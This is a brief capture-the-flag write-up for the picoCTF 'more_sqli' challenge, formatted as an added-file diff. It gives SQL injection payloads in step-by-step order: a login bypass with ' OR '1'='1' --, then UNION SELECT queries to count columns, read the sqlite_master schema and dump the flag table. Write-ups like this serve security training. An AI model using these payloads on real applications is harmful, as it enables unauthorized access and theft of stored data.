@@ -1,0 +1,21 @@
+picoctf more_sqli writeup
+
+1.find a login page
+
+2.try to use normal login and failed
+
+3.use (username=' OR '1'='1' -- passwd=aaa) to pass it
+
+4.after into a normal table page
+
+5.try search function and find it can be sqli injected
+
+//this is sqli!!! not mysql so dont use (database()) to get infomation
+
+6.use (union select 1,2,3... -- ) to get how many columns there
+
+7.use (union select 1,sql,3 from sqlite_master -- where name='table') to get table name
+
+8.get the flag's table(more_table)
+
+9.use (union select * from more_table) to get flag (picoctf{.....})
